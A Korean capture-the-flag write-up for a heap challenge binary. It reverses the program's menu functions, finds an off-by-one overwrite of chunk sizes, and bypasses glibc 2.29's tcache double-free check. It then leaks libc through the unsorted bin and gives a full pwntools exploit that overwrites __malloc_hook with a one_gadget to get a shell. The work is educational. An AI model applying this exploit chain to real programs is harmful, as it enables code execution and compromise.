# [WriteUp]CyKor - problem

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```bash
chykor12@ubuntu:~/CyKor$ gdb -q problem
Reading symbols from problem...
(No debugging symbols found in problem)
gdb-peda$ start
No unwaited-for children left.
Display various information of current execution context
Usage:
    context [reg,code,stack,all] [code/stack length]
```

GDB로 디버깅을 시도했는데 `"No debugging symbols found"`라는 메시지가 뜨며 실행이 되지 않는다. 이럴 때는 IDA에서 `main()`의 오프셋을 찾아서 GDB에서의 PIE base에 더하고, 그 주소에 break point를 걸어 놓고 실행하면 된다. IDA에서 찾은 `main()`의 오프셋은 `0x11f5`이다.

```bash
gdb-peda$ info file
Symbols from "/home/chykor12/CyKor/problem".
Local exec file:
	`/home/chykor12/CyKor/problem', file type elf64-x86-64.
	Entry point: 0x1110
...
gdb-peda$ start
No unwaited-for children left.
Display various information of current execution context
Usage:
    context [reg,code,stack,all] [code/stack length]

gdb-peda$ info file
Symbols from "/home/chykor12/CyKor/problem".
Native process:
	Using the running image of child process 52037.
	While running this, GDB does not access memory from...
Local exec file:
	`/home/chykor12/CyKor/problem', file type elf64-x86-64.
	Entry point: 0x555555555110
...
```

Entry point가 `0x555555554000`만큼 커졌기 때문에 이 값이 PIE base이다. `0x5555555551f5`에 break point를 걸고 실행해 보자.

```bash
gdb-peda$ b* 0x5555555551f5
Breakpoint 1 at 0x5555555551f5
gdb-peda$ r
Starting program: /home/chykor12/CyKor/problem
...
Breakpoint 1, 0x00005555555551f5 in ?? ()
```

정상적으로 잘 실행된다.

---

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  BLACK_PARADE();
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      fflush(stdin);
      __isoc99_scanf(&_d, &v3);
      if ( v3 != 2 )
        break;
      Join((__int64)&index + 24 * howmany_member);
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        if ( howmany_member )
          Be_savior();
        else
          puts("Band is empty!");
      }
      else
      {
        if ( v3 == 4 )
        {
          byebye();
          exit(0);
        }
LABEL_15:
        puts("Father, where are you..?\n");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_15;
      puts("\nLook at that band's marching!");
      See();
    }
  }
}
```

`main()`을 IDA로 보면 위와 같다. Subroutine들의 이름은 보기 편하게 바꿔 놓았다. `v3`에 입력받은 옵션에 따라 다른 함수를 호출하는데, 1이면 `See()`, 2면 `Join()`, 3이면 `Be_savior()`, 4면 `Byebye()`와 `exit()`을 호출한다. 

---

```c
int See()
{
  unsigned int i; // [rsp+Ch] [rbp-4h]

  if ( !howmany_member )
    puts("Band is Empty!");
  puts("\n||00----00----00----00||\n");
  for ( i = 0; i != howmany_member; ++i )
  {
    printf("||%d %s : ", i, (const char *)&index + 24 * (int)i);
    if ( *(_BYTE *)(*((_QWORD *)&index + 3 * (int)i + 2) + 16LL) || strcmp((const char *)&index + 24 * (int)i, "empty") )
      printf("%s \n", (const char *)(*((_QWORD *)&index + 3 * (int)i + 2) + 1LL));
    else
      puts("none ");
  }
  return puts("\n||00----00----00----00||");c
}
```

`index`의 오프셋은 `0x4040`이다. 이 주소에는 `Join()`에서 고른 직업(?)이 문자열로 저장되는데, 첫 멤버가 `0x4040`에 저장되고 두 번째 멤버는 `0x4058`에 저장되고 세 번째 멤버는 `0x4070`에 저장된다. 이런 식으로 `0x18`의 차이를 두고 저장되기 때문에, 멤버 이름에 접근하기 위해서 순서를 나타내는 `i`라는 변수에 24를 곱해서 `index`에 더하고 있다.

---

```c
unsigned __int64 __fastcall Join(__int64 a1)
{
  int v2; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  print_wannabe();
  fflush(stdin);
  __isoc99_scanf(&_d, &v2);
  printf("leave the memo > ");
  switch ( v2 )
  {
    case 1:
      if ( howmany_Vocal <= 3 )
      {
        *(_QWORD *)(a1 + 16) = malloc(0x18uLL);
        strcpy((char *)a1, "Vocal");
        read_str(*(_QWORD *)(a1 + 16), 24);
        ++howmany_Vocal;
        goto LABEL_21;
      }
      puts("--too many Vocals in band!--");
      break;
    case 2:
      if ( howmany_Guitar <= 1 )
      {
        *(_QWORD *)(a1 + 16) = malloc(0x30uLL);
        strcpy((char *)a1, "Guitar");
        read_str(*(_QWORD *)(a1 + 16), 48);
        ++howmany_Guitar;
        goto LABEL_21;
      }
      puts("--too many Guitars in band!--");
      break;
    case 3:
      if ( howmany_Bassist <= 2 )
      {
        *(_QWORD *)(a1 + 16) = malloc(0xB0uLL);
        strcpy((char *)a1, "Bass");
        read_str(*(_QWORD *)(a1 + 16), 48);
        ++howmany_Bassist;
        goto LABEL_21;
      }
      puts("--too many Bassist in band!--");
      break;
    case 4:
      if ( howmany_Drummer <= 1 )
      {
        *(_QWORD *)(a1 + 16) = malloc(0x50uLL);
        strcpy((char *)a1, "Drum");
        read_str(*(_QWORD *)(a1 + 16), 80);
        ++howmany_Drummer;
        goto LABEL_21;
      }
      puts("--too many Drummers in band!--");
      break;
    case 5:
      if ( howmany_Keyboard <= 3 )
      {
        *(_QWORD *)(a1 + 16) = malloc(0xB0uLL);
        strcpy((char *)a1, "Keyboard");
        read_str(*(_QWORD *)(a1 + 16), 48);
        ++howmany_Keyboard;
        goto LABEL_21;
      }
      puts("--too many Keyboard in band!--");
      break;
    case 6:
      if ( howmany_Trumpet <= 2 )
      {
        *(_QWORD *)(a1 + 16) = malloc(0x50uLL);
        *(_QWORD *)a1 = 0x7465706D757254LL;
        read_str(*(_QWORD *)(a1 + 16), 48);
        ++howmany_Trumpet;
LABEL_21:
        ++howmany_member;
      }
      else
      {
        puts("--too many Trumpet in band!--");
      }
      break;
    default:
      puts("think again!");
      break;
  }
  return __readfsqword(0x28u) ^ v3;
}
```

`Join()`은 청크를 할당하는 함수이다. 먼저 추가할 멤버의 파트를 고르도록 하는데, 파트에 따라 다른 크기의 청크를 할당해 준다. 

- `Vocal`: `0x20`byte
- `Guitar`: `0x40`byte
- `Bassist`, `Keyboard`: `0xc0`byte
- `Drummer`, `Trumpet`: `0x60`byte

그리고 일정 크기만큼 문자열을 받아서 청크에 저장한다. 크기에 따라 최대로 추가할 수 있는 멤버의 수가 정해져 있는데, 그 이상 추가하려고 하거나, 1~6이 아닌 다른 옵션을 주면 함수를 종료한다.

문자열을 받는 `read_str()`이라는 함수를 사용하는데, 왜 `read()`를 사용하지 않고 굳이 다른 함수를 정의해서 사용할까? `read_str()`의 구조를 살펴보자.

```c
__int64 __fastcall read_str(__int64 a1, int a2)
{
  __int64 result; // rax
  char buf; // [rsp+13h] [rbp-Dh]
  unsigned int v4; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v4 = 0;
  while ( 1 )
  {
    result = v4;
    if ( v4 == a2 )
      break;
    read(0, &buf, 1uLL);
    *(_BYTE *)(a1 + (int)++v4) = buf;
    if ( buf == 10 )
      return 0LL;
  }
  return result;
}
```

`v4`를 1씩 늘려가면서 `*(a1+v4)`에 한 글자씩 입력받는다. 여기서 주목해야 할 것은, `v4`를 1 증가시킬 때 전위 연산자를 사용하고 있다는 것이다. 즉, 할당된 user_data 영역보다 1바이트를 더 쓸 수 있다는 것이다. 다른 경우에는 문제가 없을 것 같지만 `Vocal`을 할당받을 때는`malloc(0x18);`을 호출한 뒤에 `read_str(a1 + 16, 0x18);`로 값을 입력받기 때문에 실제로는 user_data의 시작 주소보다 `0x19`byte 뒤까지 덮어쓸 수 있다. 즉, 다음 청크의 size 영역을 원하는 값으로 덮어쓸 수 있게 되는 취약점이 발생한다.

---

```c
unsigned __int64 Be_savior()
{
  int v1; // [rsp+Ch] [rbp-14h]
  void *ptr; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("who will be a savior?");
  See();
  putchar(62);
  __isoc99_scanf(&_d, &v1);
  if ( v1 < howmany_member && v1 >= 0 )
  {
    if ( !strcmp((const char *)&index + 24 * v1, "empty") )
      strcpy((char *)&index + 24 * v1, "non-believer");
    else
      strcpy((char *)&index + 24 * v1, "empty");
    ptr = (void *)*((_QWORD *)&index + 3 * v1 + 2);
    memset((char *)ptr + 16, 0, 0x30uLL);
    free(ptr);
    puts("savior of the broken, the beaten and the damned.");
  }
  else
  {
    puts("no one there");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

`Be_savior()`는 청크를 해제하는 함수이다. 번호를 받아서 그 번호에 맞는 멤버를 검사하는데, `"empty"`이면 `"non-believer"`를 넣고, 아니면 `"empty"`를 넣는다. 

여기서 취약점이 발생하는데, 청크를 해제하기 전에 청크의 user_data의 시작 주소+`0x10`으로부터 `0x30`byte만큼을 0으로 채운다. 만약 해제한 멤버가 `Vocal`이면 다음 청크의 fd와 bk 영역을 넘어서 덮이게 되고, `Guitar`면 다음 청크의 size까지 덮이게 된다.

---

## tcache in glibc 2.29

glibc 2.26에서는 tcache에 아무런 보안 검사가 없었기 때문에 그냥 연속으로 2개의 청크를 해제시키면 double free bug가 발생하였고, 이를 통한 exploit이 가능했다. 그래서 glibc 2.29에서는 tcache에 보안 검사를 추가하여 double free bug를 방지하고자 하였다.

> malloc: tcache double free check
>
> https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hb=bcdaad21d4635931d1bd3b54a7894276925d081d

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct
```

위의 코드를 보면, `tcache_entry` 구조체에 double free를 탐지하기 위한 `key`라는 필드가 추가되었다.

---

```c
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

`tcache_put()`은 tcache에 청크를 집어넣는 함수이다. `e->key`(bk)에 `tcache`라는 변수의 값을 저장한다. `tcache`의 값은 heapbase+`0x10`이다. heapbase에 `0x250`의 크기를 가지는 하나의 청크를 할당받아서 tcache를 관리한다. 이것을 관찰하기 위해서, `Bassist`, `Drummer`, `Vocal`을 차례대로 할당받은 뒤에 차례대로 해제해 보자.

```bash
gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x555555559000      0x0                 0x250                Used                None              None
0x555555559250      0x0                 0x410                Used                None              None
0x555555559660      0x0                 0xc0                 Freed                0x0              None
0x555555559720      0x0                 0x60                 Freed                0x0              None
0x555555559780      0x0                 0x20                 Freed                0x0    0x555555559010
gdb-peda$ x/50gx 0x555555559660
0x555555559660:	0x0000000000000000	0x00000000000000c1
0x555555559670:	0x0000000000000000	0x0000555555559010
0x555555559680:	0x0000000000000000	0x0000000000000000
0x555555559690:	0x0000000000000000	0x0000000000000000
0x5555555596a0:	0x0000000000000000	0x0000000000000000
0x5555555596b0:	0x0000000000000000	0x0000000000000000
0x5555555596c0:	0x0000000000000000	0x0000000000000000
0x5555555596d0:	0x0000000000000000	0x0000000000000000
0x5555555596e0:	0x0000000000000000	0x0000000000000000
0x5555555596f0:	0x0000000000000000	0x0000000000000000
0x555555559700:	0x0000000000000000	0x0000000000000000
0x555555559710:	0x0000000000000000	0x0000000000000000
0x555555559720:	0x0000000000000000	0x0000000000000061
0x555555559730:	0x0000000000000000	0x0000555555559010
0x555555559740:	0x0000000000000000	0x0000000000000000
0x555555559750:	0x0000000000000000	0x0000000000000000
0x555555559760:	0x0000000000000000	0x0000000000000000
0x555555559770:	0x0000000000000000	0x0000000000000000
0x555555559780:	0x0000000000000000	0x0000000000000021
0x555555559790:	0x0000000000000000	0x0000555555559010
0x5555555597a0:	0x0000000000000000	0x0000000000000000
0x5555555597b0:	0x0000000000000000	0x0000000000000000
0x5555555597c0:	0x0000000000000000	0x0000000000000000
0x5555555597d0:	0x0000000000000000	0x0000000000000000
0x5555555597e0:	0x0000000000000000	0x0000000000000000
gdb-peda$ heapbase
heapbase : 0x555555559000
```

세 개의 청크의 bk 영역에 공통적으로 `0x555555559010`이라는 값이 들어가 있다. 이 값은 heapbase보다 `0x10` 만큼 큰 값이고, `par`로 찾은 첫 번째 청크의 시작 주소보다 `0x10`만큼 큰 값이다. 즉, heapbase에 위치한 청크의 user_data 영역을 가리킨다. heapbase에 위치한 청크의 내용을 살펴보자.

```bash
gdb-peda$ x/40gx 0x555555559000
0x555555559000:	0x0000000000000000	0x0000000000000251
0x555555559010:	0x0000000100000001	0x0000000000010000
0x555555559020:	0x0000000000000000	0x0000000000000000
0x555555559030:	0x0000000000000000	0x0000000000000000
0x555555559040:	0x0000000000000000	0x0000000000000000
0x555555559050:	0x0000555555559790	0x0000000000000000
0x555555559060:	0x0000000000000000	0x0000000000000000
0x555555559070:	0x0000555555559730	0x0000000000000000
0x555555559080:	0x0000000000000000	0x0000000000000000
0x555555559090:	0x0000000000000000	0x0000000000000000
0x5555555590a0:	0x0000555555559670	0x0000000000000000
0x5555555590b0:	0x0000000000000000	0x0000000000000000
0x5555555590c0:	0x0000000000000000	0x0000000000000000
0x5555555590d0:	0x0000000000000000	0x0000000000000000
0x5555555590e0:	0x0000000000000000	0x0000000000000000
0x5555555590f0:	0x0000000000000000	0x0000000000000000
0x555555559100:	0x0000000000000000	0x0000000000000000
0x555555559110:	0x0000000000000000	0x0000000000000000
0x555555559120:	0x0000000000000000	0x0000000000000000
0x555555559130:	0x0000000000000000	0x0000000000000000
```

`0x555555559010`에서부터 저장된 데이터는 각 tcache entry에 몇 개의 청크가 들어가 있는지를 나타낸다. 각 tcache별로 1바이트씩을 차지한다. 즉, `0x555555559010`에는 `0x20`byte tcache에 들어 있는 청크의 개수, `0x555555559011`에는 `0x30`byte tcache에 들어 있는 청크의 개수, ... 가 저장되어 있다.

`0x555555559050`부터 저장된 데이터는 각 tcache entry의 처음에 있는 청크의 주소이다. 8바이트별로 나눠진다. `0x555555559050`에는 `0x20`byte tcache의 처음에 있는 청크의 주소, `0x555555559058`에는 `0x30`byte tcache의 처음에 있는 청크의 주소, ... 가 저장되어 있다.

---

```c
static void _int_free (mstate av, mchunkptr p, int have_lock) {
    ...
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);

    /* Check to see if it's already in the tcache.  */
    tcache_entry *e = (tcache_entry *) chunk2mem (p);

    /* This test succeeds on double free.  However, we don't 100%
       trust it (it also matches random payload data at a 1 in
       2^<size_t> chance), so verify it's not an unlikely coincidence
       before aborting.  */
    if (__glibc_unlikely (e->key == tcache && tcache))
      {
        tcache_entry *tmp;
        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
        for (tmp = tcache->entries[tc_idx];
             tmp;
             tmp = tmp->next)
          if (tmp == e)
            malloc_printerr ("free(): double free detected in tcache 2");
        /* If we get here, it was a coincidence.  We've wasted a few
           cycles, but don't abort.  */
      }

    if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
      {
        tcache_put (p, tc_idx);
        return;
      }
  }
```

`_int_free()`를 보면, tcache entry에서 루프를 돌면서 해제하려는 청크와 같은 주소가 tcache entry에 있으면 double free detected라는 에러 메시지를 출력한다. 즉, glibc 2.29 tcache에는 정상적인 방법으로는 같은 청크가 2개 이상 들어갈 수 없다.

---

시도해볼 수 있는 것은, `Vocal`을 할당하고 다른 사이즈의 청크를 바로 다음에 할당받고 해제한다. 그리고 `Vocal`의 off-by-one 취약점을 이용하여 바로 다음 청크의 사이즈를 바꾸는 것이다. 예를 들어서 `Vocal`과 `Keyboard`를 할당받은 후 `Keyboard`의 사이즈를 `0x41`로 바꾸면 우리가 할당받지 않은 `Guitar`처럼 행동할 것임을 예측할 수 있다. 이러고 나서 `KeyBoard`를 한 번 더 해제하면, 원래라면 tcache의 double free check에 의해 에러가 나야 정상이다. 하지만 size 영역이 `0x41`로 바뀌어 있기 때문에 tcache는 이 청크의 사이즈가 `0x40`이라고 인식하고, `0x40`byte tcache에서 이 청크가 있는지 검사할 것이다. 그러면 `0x40`byte tcache와 `0xc0`byte tcache에 같은 주소가 동시에 존재하는 상황이 된다!

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559740 (size : 0x208c0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x40)   tcache_entry[2](1): 0x555555559690
(0xc0)   tcache_entry[10](1): 0x555555559690 (overlap chunk with 0x555555559680(freed) )
gdb-peda$ x/20gx 0x555555559660
0x555555559660:	0x0000000000000000	0x0000000000000021
0x555555559670:	0x4141414141414100	0x4141414141414141
0x555555559680:	0x4141414141414141	0x0000000000000041
0x555555559690:	0x0000000000000000	0x0000555555559010
0x5555555596a0:	0x0000000000000000	0x0000000000000000
0x5555555596b0:	0x0000000000000000	0x0000000000000000
0x5555555596c0:	0x0000000000000000	0x0000000000000000
0x5555555596d0:	0x0000000000000000	0x0000000000000000
0x5555555596e0:	0x0000000000000000	0x0000000000000000
0x5555555596f0:	0x0000000000000000	0x0000000000000000
```

이 상태에서 `Guitar`를 할당받고(`Keyboard`는 최대 3개까지 할당받을 수 있기 때문에 fake chunk를 할당받기 위해서 사용할 것이다.) 원하는 값을 쓰면 다른(사실은 같은) 청크의 fd를 조작할 수 있다. 물론 맨 마지막 바이트는 `"\x00"`이 된다.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559740 (size : 0x208c0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0xc0)   tcache_entry[10](1): 0x555555559690 --> 0x6161616161616100 (invaild memory)
gdb-peda$ x/20gx 0x555555559660
0x555555559660:	0x0000000000000000	0x0000000000000021
0x555555559670:	0x4141414141414100	0x4141414141414141
0x555555559680:	0x4141414141414141	0x0000000000000041
0x555555559690:	0x6161616161616100	0x00000a6161616161
0x5555555596a0:	0x0000000000000000	0x0000000000000000
0x5555555596b0:	0x0000000000000000	0x0000000000000000
0x5555555596c0:	0x0000000000000000	0x0000000000000000
0x5555555596d0:	0x0000000000000000	0x0000000000000000
0x5555555596e0:	0x0000000000000000	0x0000000000000000
0x5555555596f0:	0x0000000000000000	0x0000000000000000
```

이 상태에서 `Keyboard`를 1번 할당받아 보자.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559740 (size : 0x208c0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0xc0)   tcache_entry[10](0): 0x6161616161616100 (invaild memory)
```

이 상태에서 `Keyboard`를 1번 더 할당받으면 Segmentation fault가 뜨면서 프로그램이 죽는다. `0x6161616161616100`이라는 주소에 접근할 수 없기 때문이다. fd를 조작할 수 있음을 알았으니, 의미 있는 주소를 찾아서 적어 주면 그 주소에 fake chunk를 할당받아서 값을 자유롭게 덮어쓸 수 있을 것이다.

---

이제 메모리 릭을 할 수 있는 방법을 찾아보자. PIE와 ASLR 때문에 모든 주소가 랜덤하게 매핑된다. 힙에서 libc leak을 하는 대표적인 방법은 해제된 청크가 unsortbin으로 들어갈 때 fd와 bk 영역에 `main_arena()`의 중간 주소가 들어가는 것을 이용하여 그 값을 뽑아내는 것인데, tcache에는 그런 특성이 없다.  `0xc0` 바이트 청크를 unsortbin으로 보내려면 7개를 먼저 tcache에 넣고 다른 청크를 해제시켜야 하는데, 정상적인 방법으로 할당받을 수 있는 `0xc0`바이트 청크는 7개뿐이다. 그렇기 때문에 사이즈를 조작하는 등의 방법을 통해서 `0xc0`바이트 청크를 8개 이상 해제시켜야 한다.

`Vocal` - `Guitar` - `Keyboard` - `Vocal` - `Trumpet` - `Bassist` -  `Bassist` -  `Bassist` - `Keyboard` - `Keyboard` - `Keyboard`

앞에서부터 순서대로 할당받은 상황을 생각해 보자.

먼저 뒤의 `Bassist` 3개와 `Keyboard` 3개를 해제시켜서 `0xc0`byte tcache를 6개 채운다. 그리고 2번째 `Vocal`로 `Trumpet`의 사이즈를 `0xc1`로 바꾼 다음 `Trumpet`을 해제시키면, 이 청크는 `0xc0`byte tcache의 7번째 청크가 될 것이다. 이후 앞쪽의 `Keyboard`를 해제하면 이 청크는 unsortbin에 들어가고 fd와 bk 영역에 libc leak을 할 수 있는 값이 들어갈 것이다.

1번째 `Vocal`로 `Guitar`의 사이즈를 `0x61`로 바꾼 다음 `Guitar`를 해제시키고, `Drummer`를 할당받으면 우리는 그 주소부터 `0x50`바이트만큼의 입력을 받을 수 있다. 그러면 libc 주소가 있는 필드까지 `"\x00"`이 없도록 연결할 수 있고, `See()`를 통해 릭에 성공할 수 있을 것이다.

```python
# exploit_problem.py

from pwn import *

p = process('./problem')

def See():
    p.recvuntil(">\n")
    p.sendline("1")

def Join(wannabe, memo):
    p.recvuntil(">\n")
    p.sendline("2")
    p.recvuntil(">\n")
    p.sendline(str(wannabe))
    p.recvuntil("> ")
    p.send(memo)

def BeSavior(index):
    p.recvline(">\n")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(str(index))

Join(1,"\n") # index: 0, Vocal 1
Join(2, "\n") # index: 1, Guitar 1
Join(5, "\n") # index: 2, Keyboard 1
Join(1, "\n") # index: 3, Vocal 2
Join(6, "\n") # index: 4, Trumpet 1

for i in range(3):
    Join(3, "\n") # index: 5,6,7, Bassist 3

for i in range(3):
    Join(5, "\n") # index: 8,9,10, Keyboard 4

BeSavior(5)
BeSavior(6)
BeSavior(7)
BeSavior(8)
BeSavior(9)
BeSavior(10)

BeSavior(3) 
Join(1, "A"*0x17+"\xc1") # index: 11, Vocal 3
BeSavior(4)

BeSavior(2) # unsortbin

BeSavior(0)
Join(1, "A"*0x17+"\x61") # index: 12, Vocal 4
BeSavior(1)
Join(4, "A"*0x3e+"\n") # index: 13, Drummer 1

pause()

p.interactive()
```

```bash
gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x55f4b3311000      0x0                 0x250                Used                None              None
0x55f4b3311250      0x0                 0x1010               Used                None              None
0x55f4b3312260      0x0                 0x20                 Used                None              None
0x55f4b3312280      0x4141414141414141  0x60                 Freed 0x41414141414141000x4141414141414141
Corrupt ?! (size == 0) (0x55f4b33122e0)
gdb-peda$ x/20gx 0x55f4b3312260
0x55f4b3312260:	0x0000000000000000	0x0000000000000021
0x55f4b3312270:	0x4141414141414100	0x4141414141414141
0x55f4b3312280:	0x4141414141414141	0x0000000000000061
0x55f4b3312290:	0x4141414141414100	0x4141414141414141
0x55f4b33122a0:	0x4141414141414141	0x4141414141414141
0x55f4b33122b0:	0x4141414141414141	0x4141414141414141
0x55f4b33122c0:	0x4141414141414141	0x0a41414141414141
0x55f4b33122d0:	0x00007f777d392ca0	0x00007f777d392ca0
0x55f4b33122e0:	0x0000000000000000	0x0000000000000000
0x55f4b33122f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/x 0x7f777d392ca0
0x7f777d392ca0 <main_arena+96>:	0x000055f4b3312880
```

`0x55f4b33122d0`이 unsortbin에 들어간 청크의 fd 영역이며, 이 영역에 저장된 주소는 `main_arena+96`이다. `See()`를 호출하면 index 13의 `Drummer`에 저장된 내용을 출력할 때 이 주소가 leak되어 나올 것이다.

---

앞에서 설명한 fd를 조작하는 과정과 libc leak을 하는 과정을 동시에 수행할 수 있는 방법을 찾아야 한다. 청크의 크기를 조작하려면 `Vocal`을 두 번 할당받아야 하는데, 최대 4번까지만 가능하기 때문에 두 가지 과정을 동시에 수행해야 한다.

`Vocal` - `Guitar` - `Keyboard` - `Vocal` - `Trumpet` - `Bassist` -  `Bassist` -  `Bassist` - `Keyboard` - `Keyboard` - `Keyboard`

앞에서 만들어 놓은 청크들의 배열이다. 앞에서는 `Guitar`를 해제시키지 않고 바로 사이즈를 바꿨는데, 사이즈를 바꾸기 전에 `Guitar`를 먼저 해제시키면 이 청크는 결과적으로 `0x40`byte tcache와 `0x60`byte tcache에 동시에 들어가게 된다. 앞에서 설명한 fd 조작 방법을 참고하자. 이후에 `Guitar`를 할당받아서 fd 영역에 malloc hook의 주소를 써 주고, malloc hook을 one gadget의 주소로 덮어 주면, 아무 멤버나 할당받을 때 쉘을 획득할 수 있을 것이다.

```bash
gdb-peda$ print &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x7f072e5d3c30 <__malloc_hook>
```

우리는 청크를 새로 할당받을 때, 전위 연산자 때문에 첫 바이트는 `"\x00"`이 되는 것을 확인했다. `malloc hook`의 끝 1바이트는 `0x30`이기 때문에 덮어쓰려면 최소 `0x37`바이트를 입력할 수 있어야 한다. 이 조건을 만족하는 멤버는 `Drummer`가 있다.

다음으로 사용할 one gadget을 찾아보자.

```bash
chykor12@ubuntu:~/CyKor$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.29.so
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

정확하게 하려면 `malloc()`으로 들어가서 malloc hook에 저장된 주소로 점프하는 순간에 레지스터들의 값을 보고 조건에 맞는 가젯을 찾으면 되는데, 귀찮으니까 그냥 조건이 제일 간단해 보이는 `0x106ef8`의 가젯을 사용하도록 하자(작동하지 않을 수도 있다. 그러면 다른 걸로 시도하자).

---

최종 익스플로잇은 다음과 같다.

```python
# exploit_problem.py

from pwn import *

p = process('./problem')

offset_mallochook = 0x1e4c30 # offset of &__malloc_hook from libc base
offset_mainarena = 0x1e4c40 # offset of main_arena() from libc base
offset_onegadget = 0x106ef8 # offset of one_gadget from libc base

def See():
    p.recvuntil(">\n")
    p.sendline("1")

def Join(wannabe, memo):
    p.recvuntil(">\n")
    p.sendline("2")
    p.recvuntil(">\n")
    p.sendline(str(wannabe))
    p.recvuntil("> ")
    p.send(memo)

def BeSavior(index):
    p.recvline(">\n")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(str(index))

Join(1,"\n") # index: 0, Vocal 1
Join(2, "\n") # index: 1, Guitar 1
Join(5, "\n") # index: 2, Keyboard 1
Join(1, "\n") # index: 3, Vocal 2
Join(6, "\n") # index: 4, Trumpet 1

for i in range(3):
    Join(3, "\n") # index: 5,6,7, Bassist 3

for i in range(3):
    Join(5, "\n") # index: 8,9,10, Keyboard 4

BeSavior(5)
BeSavior(6)
BeSavior(7)
BeSavior(8)
BeSavior(9)
BeSavior(10)

BeSavior(3) 
Join(1, "A"*0x17+"\xc1") # index: 11, Vocal 3
BeSavior(4)

BeSavior(2) # unsortbin

BeSavior(1)
BeSavior(0)
Join(1, "A"*0x17+"\x61") # index: 12, Vocal 4
BeSavior(1)
Join(4, "A"*0x3e+"\n") # index: 13, Drummer 1
pause()
See()
p.recvuntil("Drum : ")
p.recvline()
addr_mainarena = u64(p.recv(6).ljust(8, "\x00")) - 96 # address of main_arena()
log.info("address of main_arena(): " + hex(addr_mainarena))
addr_libc = addr_mainarena - offset_mainarena # address of libc base
log.info("address of libc base: " + hex(addr_libc))
addr_mallochook = addr_libc + offset_mallochook # address of &__malloc_hook
log.info("address of malloc hook: " + hex(addr_mallochook))
addr_onegadget = addr_libc + offset_onegadget # address of one_gadget

BeSavior(13)
Join(2, p64(addr_mallochook)[1:]+"\n") # index: 14, Guitar 2
Join(6, "\n") # index: 15, Trumpet 2
Join(4, "A"*0x2f+p64(addr_onegadget)+"\n") # index: 16, Drummer 2

# Get shell
p.recvuntil(">\n")
p.sendline("2")
p.recvuntil(">\n")
p.sendline("6") # index: 17, Trumpet 3

p.interactive()
```

